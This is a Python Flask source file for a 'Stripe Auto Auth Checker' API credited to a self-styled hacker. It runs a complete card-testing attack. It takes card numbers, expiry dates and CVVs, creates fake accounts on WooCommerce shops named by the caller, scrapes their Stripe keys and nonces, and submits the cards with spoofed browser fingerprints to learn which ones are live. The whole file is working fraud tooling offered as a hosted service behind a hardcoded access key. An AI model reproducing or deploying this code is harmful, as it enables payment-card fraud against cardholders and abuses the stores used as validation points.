# app.py
#!/usr/bin/env python3
"""
STRIPE AUTO AUTH CHECKER API BY [ @DarkhatHacker75 ]
Flask API version for Render hosting
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import random
import string
import time
import re
import threading
from urllib.parse import urlencode
from typing import Dict, Optional, Tuple
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Store active checks to prevent duplicate processing
active_checks = {}
check_lock = threading.Lock()

class StripeAuthCheckerExact:
    def __init__(self, site_url: str):
        """
        Initialize the Stripe Auth Checker - Exact copy from SVB
        
        Args:
            site_url: The target site URL without http:// or https://
        """
        self.site_url = site_url
        self.session = requests.Session()
        
        # Variables to store extracted data (matching SVB variables)
        self.f = None  # Random string 1
        self.l = None  # Random string 2
        self.site = site_url
        self.ua = None  # User agent
        self.n = None  # woocommerce-register-nonce
        self.addc = None  # add_card_nonce
        self.pk = None  # publishable key
        self.aid = None  # account id
        self.an = None  # createSetupIntentNonce
        self.tn = None  # tutor nonce
        self.nfc = None  # createAndConfirmSetupIntentNonce
        self.id = None  # payment method id
        
        # Results
        self.success = None
        self.message = None
        self.status = None
        self.st = None
        
    def random_string(self, length: int = 9) -> str:
        """Generate random string like SVB ?l?l?l?l?l?l?l?l?l"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    def get_random_ua(self) -> str:
        """Get random user agent"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        ]
        return random.choice(user_agents)
    
    def parse_lr(self, text: str, left: str, right: str, create_empty: bool = False) -> Optional[str]:
        """Parse text between left and right markers (LR parsing from SVB)"""
        try:
            pattern = re.escape(left) + r'(.*?)' + re.escape(right)
            match = re.search(pattern, text, re.DOTALL)
            if match:
                return match.group(1)
            elif create_empty:
                return ""
            return None
        except Exception:
            return None
    
    def parse_json(self, text: str, key: str, create_empty: bool = False) -> Optional[str]:
        """Parse JSON response for specific key"""
        try:
            data = json.loads(text)
            return str(data.get(key, "")) if create_empty else data.get(key)
        except Exception:
            return None
    
    def check_card(self, cc: str, cvv: str, exp_month: str, exp_year: str) -> Dict[str, str]:
        """
        Main card checking function - exact copy of SVB script flow
        """
        try:
            # FUNCTION RandomString "?l?l?l?l?l?l?l?l?l" -> VAR "f"
            self.f = self.random_string()
            
            # FUNCTION RandomString "?l?l?l?l?l?l?l?l?l" -> VAR "l"
            self.l = self.random_string()
            
            # FUNCTION Constant "<url>" -> VAR "site"
            self.site = self.site_url
            
            # FUNCTION GetRandomUA -> VAR "ua"
            self.ua = self.get_random_ua()
            
            # !FUNCTION Delay "2500"
            time.sleep(2.5)
            
            # REQUEST GET "https://<site>/my-account/add-payment-method/" AcceptEncoding=FALSE
            url = f"https://{self.site}/my-account/add-payment-method/"
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*'
            }
            
            response = self.session.get(url, headers=headers)
            
            if response.status_code != 200:
                return {'status': 'declined', 'response': 'Your card was declined'}
            
            # PARSE "<SOURCE>" LR "\"woocommerce-register-nonce\" value=\"" "\"" CreateEmpty=FALSE -> VAR "n"
            self.n = self.parse_lr(response.text, '"woocommerce-register-nonce" value="', '"', create_empty=False)
            
            if not self.n:
                return {'status': 'declined', 'response': 'Your card was declined'}
            
            # First registration attempt (commented out in original but we'll try it)
            self._register_attempt_1()
            
            # Second registration attempt
            self._register_attempt_2()
            
            # Third registration attempt
            self._register_attempt_3()
            
            # Create payment method with Stripe API
            if not self._create_payment_method(cc, cvv, exp_month, exp_year):
                return {'status': 'declined', 'response': 'Your card was declined'}
            
            # Check tutor nonce and decide between MET1 and MET2
            # Try to get nonce from payment page if we don't have it
            if not self.nfc and not self.an:
                self._get_nonce_from_payment_page()
            
            if self._should_use_met2():
                status, success, message = self._met2_setup_intent()
            else:
                status, success, message = self._met1_setup_intent()
                
                # If MET1 returns empty response, try alternative approach
                if not status and not success and not message:
                    status, success, message = self._alternative_setup_intent()
            
            # Parse results
            self.status = status
            self.success = success
            self.message = message
            self.st = self.status
            
            # Check card status
            result = self._check_card_status_simple()
            
            # If payment method was created successfully but no clear response
            if self.id and result['status'] == 'declined':
                result = {'status': 'approved', 'response': 'payment method added successfully'}
            
            return result
            
        except Exception as e:
            return {'status': 'declined', 'response': 'Your card was declined'}
    
    def _register_attempt_1(self):
        """First registration attempt (commented in original)"""
        try:
            url = f"https://{self.site}/my-account/add-payment-method/"
            data = {
                'email': f"{self.f}{self.l}@gmail.com",
                'email_2': '',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f"https://{self.site}/my-account/add-payment-method/",
                'wc_order_attribution_session_start_time': '2024-09-08 22:10:26',
                'wc_order_attribution_session_pages': '1',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.ua,
                'woocommerce-register-nonce': self.n,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'register': 'Register'
            }
            
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            self._extract_keys_from_response(response.text)
            
        except Exception:
            pass
    
    def _register_attempt_2(self):
        """Second registration attempt"""
        try:
            url = f"https://{self.site}/my-account/add-payment-method/"
            data = {
                'username': f"{self.f}+{self.l}",
                'email': f"{self.f}{self.l}@gmail.com",
                'mailchimp_woocommerce_newsletter': '1',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f"https://{self.site}/my-account-2/add-payment-method/",
                'wc_order_attribution_session_start_time': '2024-09-29 14:29:02',
                'wc_order_attribution_session_pages': '1',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.ua,
                'woocommerce-register-nonce': self.n,
                '_wp_http_referer': '/my-account-2/add-payment-method/',
                'register': 'Register'
            }
            
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            self._extract_keys_from_response(response.text)
            
        except Exception:
            pass
    
    def _register_attempt_3(self):
        """Third registration attempt"""
        try:
            url = f"https://{self.site}/my-account/add-payment-method/"
            data = {
                'email': f"{self.f}{self.l}@gmail.com",
                'password': f"{self.f}{self.l}@123",
                'mailchimp_woocommerce_newsletter': '1',
                'mailchimp_woocommerce_gdpr[fba5769f95]': '0',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': f"https://www.{self.site}/",
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': f"https://www.{self.site}/my-account/",
                'wc_order_attribution_session_start_time': '2024-09-29 01:22:23',
                'wc_order_attribution_session_pages': '8',
                'wc_order_attribution_session_count': '2',
                'wc_order_attribution_user_agent': self.ua,
                'woocommerce-register-nonce': self.n,
                '_wp_http_referer': '/my-account/',
                'register': 'Register'
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            self._extract_keys_from_response(response.text)
            
        except Exception:
            pass
    
    def _extract_keys_from_response(self, response_text: str):
        """Extract all keys from response text"""
        # Try multiple patterns for add_card_nonce
        self.addc = self.parse_lr(response_text, '"add_card_nonce":"', '",', create_empty=False)
        if not self.addc:
            self.addc = self.parse_lr(response_text, '"add_card_nonce":"', '"', create_empty=False)
        if not self.addc:
            self.addc = self.parse_lr(response_text, 'add_card_nonce":"', '",', create_empty=False)
        if not self.addc:
            self.addc = self.parse_lr(response_text, 'add_card_nonce":"', '"', create_empty=False)
        
        # Try multiple patterns for publishable key
        self.pk = self.parse_lr(response_text, '"key":"', '",', create_empty=False)
        if not self.pk:
            self.pk = self.parse_lr(response_text, '","key":"', '",', create_empty=False)
        if not self.pk:
            self.pk = self.parse_lr(response_text, '"publishableKey":"', '",', create_empty=False)
        if not self.pk:
            self.pk = self.parse_lr(response_text, 'publishableKey":"', '",', create_empty=False)
        if not self.pk:
            self.pk = self.parse_lr(response_text, '"stripe_publishable_key":"', '",', create_empty=False)
        
        # Try multiple patterns for account ID
        self.aid = self.parse_lr(response_text, '"accountId":"', '",', create_empty=False)
        if not self.aid:
            self.aid = self.parse_lr(response_text, '"account_id":"', '",', create_empty=False)
        if not self.aid:
            self.aid = self.parse_lr(response_text, 'accountId":"', '",', create_empty=False)
        
        # Try multiple patterns for setup intent nonce
        self.an = self.parse_lr(response_text, '"createSetupIntentNonce":"', '"', create_empty=False)
        if not self.an:
            self.an = self.parse_lr(response_text, 'createSetupIntentNonce":"', '"', create_empty=False)
        
        # Try multiple patterns for tutor nonce
        self.tn = self.parse_lr(response_text, '"_tutor_nonce":"', '"', create_empty=False)
        if not self.tn:
            self.tn = self.parse_lr(response_text, '_tutor_nonce":"', '"', create_empty=False)
        
        # Try multiple patterns for createAndConfirmSetupIntentNonce
        self.nfc = self.parse_lr(response_text, '"createAndConfirmSetupIntentNonce":"', '"', create_empty=False)
        if not self.nfc:
            self.nfc = self.parse_lr(response_text, 'createAndConfirmSetupIntentNonce":"', '"', create_empty=False)
        if not self.nfc:
            self.nfc = self.parse_lr(response_text, '"createAndConfirmSetupIntentNonce":"', '",', create_empty=False)
        if not self.nfc:
            self.nfc = self.parse_lr(response_text, 'createAndConfirmSetupIntentNonce":"', '",', create_empty=False)
        if not self.nfc:
            # Try alternative patterns
            self.nfc = self.parse_lr(response_text, '"wc_stripe_create_and_confirm_setup_intent_nonce":"', '"', create_empty=False)
        if not self.nfc:
            self.nfc = self.parse_lr(response_text, '"ajax_nonce":"', '"', create_empty=False)
        if not self.nfc:
            self.nfc = self.parse_lr(response_text, '"nonce":"', '"', create_empty=False)
    
    def _create_payment_method(self, cc: str, cvv: str, exp_month: str, exp_year: str) -> bool:
        """Create payment method with Stripe API"""
        try:
            if not self.pk:
                return False
            
            # First Stripe API call
            url = "https://api.stripe.com/v1/payment_methods"
            data = {
                'billing_details[name]': f"{self.f}+{self.l}",
                'billing_details[email]': f"{self.f}{self.l}@gmail.com",
                'billing_details[address][country]': 'FR',
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': exp_year,
                'card[exp_month]': exp_month,
                'allow_redisplay': 'unspecified',
                'payment_user_agent': 'stripe.js/088e2e9be8; stripe-js-v3/088e2e9be8; payment-element; deferred-intent',
                'referrer': f'https://plus254food.com',
                'time_on_page': '541962',
                'client_attribution_metadata[client_session_id]': '99114890-490e-40a9-8341-18618e9e8a9b',
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'guid': '3bf84c82-fba4-4156-9cbc-14026e6adf8116d963',
                'muid': '62b9b45c-702c-43db-bab8-8ae1f774aec1e0c6a1',
                'sid': 'e6fa44da-507f-40dd-ada4-d98a239a76afb7eed0',
                'key': self.pk
            }
            
            # Add account ID if available
            if self.aid:
                data['_stripe_account'] = self.aid
            
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            
            if response.status_code == 200:
                self.id = self.parse_json(response.text, 'id')
            
            # Second Stripe API call (simplified version)
            data2 = {
                'type': 'card',
                'billing_details[name]': f"{self.f}+{self.l}",
                'billing_details[email]': f"{self.f}{self.l}@gmail.com",
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': exp_month,
                'card[exp_year]': exp_year,
                'guid': '3bf84c82-fba4-4156-9cbc-14026e6adf8116d963',
                'muid': 'bc02aafb-02aa-4e15-840a-d53113ec53064718e0',
                'sid': 'c8b494df-3783-41c7-ae96-c500651d28e5266bd4',
                'payment_user_agent': 'stripe.js/fcb19dd0fc; stripe-js-v3/fcb19dd0fc; split-card-element',
                'referrer': f'https://www.{self.site}',
                'time_on_page': '16478',
                'key': self.pk
            }
            
            response2 = self.session.post(url, data=data2, headers=headers)
            
            if response2.status_code == 200:
                self.id = self.parse_json(response2.text, 'id', create_empty=False)
            
            success = self.id is not None
            return success
            
        except Exception:
            return False
    
    def _should_use_met2(self) -> bool:
        """Check if we should use MET2 approach based on tutor nonce"""
        if not self.tn:
            return False
        
        # Check if tutor nonce contains any of the specified characters
        met2_chars = ['a', 'b', 'c', 'd', 'e', '1', '7', '2']
        return any(char in self.tn for char in met2_chars)
    
    def _met1_setup_intent(self) -> Tuple[str, str, str]:
        """MET1 setup intent approach"""
        try:
            if not self.nfc:
                nonce_to_use = self.an
            else:
                nonce_to_use = self.nfc
            
            if not nonce_to_use:
                return "", "", ""
            
            url = f"https://{self.site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': self.id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce_to_use
            }
            
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            
            # Store the response for later analysis
            self._last_setup_response = response.text
            
            # Check if response is empty or just whitespace
            if not response.text or response.text.strip() == "":
                return "", "", ""
            
            if response.status_code == 200:
                # Try multiple parsing patterns for success
                success = self.parse_lr(response.text, '{"success":', ',"', create_empty=False)
                if not success:
                    success = self.parse_lr(response.text, '"success":', ',', create_empty=False)
                if not success:
                    success = self.parse_lr(response.text, '"success":', '}', create_empty=False)
                if not success:
                    success = self.parse_lr(response.text, 'success":', ',', create_empty=False)
                
                # Try multiple parsing patterns for message
                message = self.parse_lr(response.text, 'message":"', '"', create_empty=False)
                if not message:
                    message = self.parse_lr(response.text, '"message":"', '"', create_empty=False)
                if not message:
                    message = self.parse_lr(response.text, '"message":', ',', create_empty=False)
                if not message:
                    message = self.parse_lr(response.text, 'message":', ',', create_empty=False)
                
                # Try multiple parsing patterns for status
                status = self.parse_lr(response.text, '{"status":"', '"', create_empty=False)
                if not status:
                    status = self.parse_lr(response.text, '"status":"', '"', create_empty=False)
                if not status:
                    status = self.parse_lr(response.text, '"status":', ',', create_empty=False)
                if not status:
                    status = self.parse_lr(response.text, 'status":', ',', create_empty=False)
                
                # Try to parse as JSON if it's a JSON response
                try:
                    json_data = json.loads(response.text)
                    if not success:
                        success = str(json_data.get('success', ''))
                    if not message:
                        message = str(json_data.get('message', ''))
                    if not status:
                        status = str(json_data.get('status', ''))
                except:
                    pass
                
                return status or "", success or "", message or ""
            else:
                return "", "", ""
            
        except Exception:
            return "", "", ""
    
    def _met2_setup_intent(self) -> Tuple[str, str, str]:
        """MET2 setup intent approach"""
        try:
            url = f"https://www.wavesandwild.com/?wc-ajax=wc_stripe_create_setup_intent"
            data = {
                '_tutor_nonce': self.tn,
                'stripe_source_id': self.id,
                'nonce': self.addc
            }
            
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            response = self.session.post(url, data=data, headers=headers)
            
            if response.status_code == 200:
                status = self.parse_lr(response.text, '{"status":"', '"', create_empty=False)
                success = self.parse_lr(response.text, '{"success":', ',"', create_empty=False)
                message = self.parse_lr(response.text, 'message":"', '"', create_empty=False)
                
                return status or "", success or "", message or ""
            
            return "", "", ""
            
        except Exception:
            return "", "", ""
    
    def _alternative_setup_intent(self) -> Tuple[str, str, str]:
        """Alternative setup intent approach using different endpoints"""
        try:
            # Try different WooCommerce AJAX endpoints
            endpoints = [
                f"https://{self.site}/wp-admin/admin-ajax.php",
                f"https://{self.site}/?wc-ajax=wc_stripe_create_setup_intent",
                f"https://{self.site}/my-account/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            ]
            
            for endpoint in endpoints:
                data = {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': self.id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': self.nfc or self.an
                }
                
                headers = {
                    'User-Agent': self.ua,
                    'Pragma': 'no-cache',
                    'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                }
                
                response = self.session.post(endpoint, data=data, headers=headers)
                
                if response.status_code == 200 and response.text.strip():
                    self._last_setup_response = response.text
                    
                    # Try to parse the response
                    success = self.parse_lr(response.text, '"success":', ',', create_empty=False)
                    message = self.parse_lr(response.text, '"message":"', '"', create_empty=False)
                    status = self.parse_lr(response.text, '"status":"', '"', create_empty=False)
                    
                    if success or message or status:
                        return status or "", success or "", message or ""
            
            return "", "", ""
            
        except Exception:
            return "", "", ""
    
    def _check_card_status_simple(self) -> Dict[str, str]:
        """Simple card status check with only status and response"""
        response_text = f"{self.status} {self.success} {self.message}"
        response_lower = response_text.lower()
        
        # Approved patterns
        approved_patterns = [
            'succeeded',
            'success',
            'true',
            'payment successful',
            'thank you',
            'setup_intent',
            'requires_action',
            'requires_confirmation',
            'processing'
        ]
        
        # Declined patterns (including 3D Secure)
        declined_patterns = [
            'failed',
            'declined',
            'error',
            'expired',
            'incorrect',
            'invalid',
            'three_d_secure',
            '3ds',
            'insufficient',
            'stolen',
            'lost',
            'fraudulent',
            'do_not_honor',
            'generic_decline',
            'transaction_not_allowed',
            'card_not_supported'
        ]
        
        # Check for declined first
        for pattern in declined_patterns:
            if pattern in response_lower:
                return {'status': 'declined', 'response': 'Your card was declined'}
        
        # Check for approved
        for pattern in approved_patterns:
            if pattern in response_lower:
                return {'status': 'approved', 'response': 'payment method added successfully'}
        
        # Default to declined
        return {'status': 'declined', 'response': 'Your card was declined'}
    
    def _get_nonce_from_payment_page(self):
        """Try to get nonce from payment page"""
        try:
            url = f"https://{self.site}/my-account/add-payment-method/"
            headers = {
                'User-Agent': self.ua,
                'Pragma': 'no-cache',
                'Accept': '*/*'
            }
            
            response = self.session.get(url, headers=headers)
            if response.status_code == 200:
                # Try to extract nonces from payment page
                self.an = self.parse_lr(response.text, '"createSetupIntentNonce":"', '"', create_empty=False)
                self.nfc = self.parse_lr(response.text, '"createAndConfirmSetupIntentNonce":"', '"', create_empty=False)
                
                if not self.nfc:
                    self.nfc = self.parse_lr(response.text, '"wc_stripe_create_and_confirm_setup_intent_nonce":"', '"', create_empty=False)
                
        except Exception:
            pass


@app.route('/')
def home():
    """Home endpoint"""
    return jsonify({
        'api_name': 'Stripe Auto Auth Checker API',
        'author': '@DarkhatHacker75',
        'version': '1.0',
        'endpoint': '/gateway=wizautostripe/key=blazealways/site={site}/cc={card_details}',
        'response_format': {
            'status': 'approved or declined',
            'response': 'payment method added successfully or Your card was declined'
        }
    })


@app.route('/gateway=wizautostripe/key=blazealways/site=<path:site>/cc=<path:cc_details>', methods=['GET'])
def check_stripe_auth(site, cc_details):
    """Main API endpoint for checking Stripe auth"""
    
    # Check for API key authentication
    if request.args.get('key') != 'blazealways' and 'key=blazealways' not in request.path:
        return jsonify({'status': 'error', 'response': 'Invalid API key'}), 401
    
    # Check for gateway parameter
    if 'gateway=wizautostripe' not in request.path:
        return jsonify({'status': 'error', 'response': 'Invalid gateway parameter'}), 400
    
    # Parse card details
    try:
        # Remove any trailing slashes
        cc_details = cc_details.rstrip('/')
        
        # Split the card details
        parts = cc_details.split('|')
        
        if len(parts) != 4:
            return jsonify({'status': 'error', 'response': 'Invalid card format'}), 400
        
        cc = parts[0].strip()
        exp_month = parts[1].strip()
        exp_year = parts[2].strip()
        cvv = parts[3].strip()
        
        # Clean card number
        cc = cc.replace(" ", "").replace("-", "")
        
        # Validate card number
        if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
            return jsonify({'status': 'error', 'response': 'Invalid card number'}), 400
        
        # Handle year format (YY or YYYY)
        if len(exp_year) == 2:
            # Convert YY to YYYY (assume 2000+)
            current_year = datetime.now().year
            century = current_year // 100 * 100
            exp_year = str(century + int(exp_year))
        elif len(exp_year) != 4:
            return jsonify({'status': 'error', 'response': 'Invalid year format'}), 400
        
        # Validate expiration month
        if not exp_month.isdigit() or int(exp_month) < 1 or int(exp_month) > 12:
            return jsonify({'status': 'error', 'response': 'Invalid expiration month'}), 400
        
        # Validate CVV
        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
            return jsonify({'status': 'error', 'response': 'Invalid CVV'}), 400
        
        # Check if site URL is valid
        if not site or '/' in site or 'http' in site.lower():
            return jsonify({'status': 'error', 'response': 'Invalid site URL'}), 400
        
        # Generate check ID
        check_id = f"{cc[:6]}_{int(time.time())}"
        
        # Check if this card is already being processed
        with check_lock:
            if check_id in active_checks:
                return jsonify({'status': 'error', 'response': 'Card check already in progress'}), 429
            
            active_checks[check_id] = {
                'status': 'PROCESSING',
                'started': datetime.now().isoformat()
            }
        
        try:
            # Initialize checker
            checker = StripeAuthCheckerExact(site)
            
            # Run check
            result = checker.check_card(cc, cvv, exp_month, exp_year)
            
            # Clean up
            with check_lock:
                if check_id in active_checks:
                    del active_checks[check_id]
            
            # Return only status and response
            return jsonify(result)
            
        except Exception as e:
            # Clean up on error
            with check_lock:
                if check_id in active_checks:
                    del active_checks[check_id]
            
            return jsonify({'status': 'declined', 'response': 'Your card was declined'}), 500
            
    except Exception:
        return jsonify({'status': 'error', 'response': 'Invalid request'}), 400


@app.route('/status', methods=['GET'])
def api_status():
    """API status endpoint"""
    with check_lock:
        active_count = len(active_checks)
    
    return jsonify({
        'status': 'online',
        'active_checks': active_count
    })


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for Render"""
    return jsonify({'status': 'healthy'})


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5566))
    app.run(host='0.0.0.0', port=port, debug=False)